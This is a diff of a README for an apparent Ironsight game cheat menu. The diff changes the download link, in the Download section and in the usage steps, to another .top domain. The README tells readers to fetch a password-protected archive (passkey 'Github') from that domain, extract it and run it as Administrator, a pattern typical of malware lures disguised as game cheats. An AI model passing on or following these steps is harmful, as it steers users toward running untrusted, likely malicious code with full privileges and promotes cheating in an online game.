@@ -6,7 +6,7 @@ Ironsight external menu with ESP, aimbot, radar hack, and more. For educational 
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -74,7 +74,7 @@ Based on popular mods like **Internal Cheat**, **External Overlay**, and **Trigg
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch Ironsight.
 4. Run the hack **as Administrator**.
